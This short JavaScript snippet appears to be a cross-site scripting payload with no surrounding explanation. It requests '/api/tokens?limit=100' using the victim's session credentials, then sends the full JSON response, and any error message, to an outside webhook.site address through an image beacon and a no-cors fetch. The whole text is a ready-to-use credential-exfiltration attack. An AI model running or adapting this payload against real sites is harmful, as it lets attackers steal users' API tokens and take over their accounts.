fetch("/api/tokens?limit=100", {
  method: "GET",
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  // Encode the entire JSON response
  const payload = encodeURIComponent(JSON.stringify(data));

  // Send it as a GET request to your webhook
  const exfil = `https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?fullResponse=${payload}`;

  // Use image beacon (works cross-origin)
  const img = new Image();
  img.src = exfil;

  // Also use fetch as fallback (no-cors)
  fetch(exfil, { mode: "no-cors" });
})
.catch(e => {
  // Send error to webhook
  const err = encodeURIComponent(e.message);
  new Image().src = `https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371?error=${err}`;
});
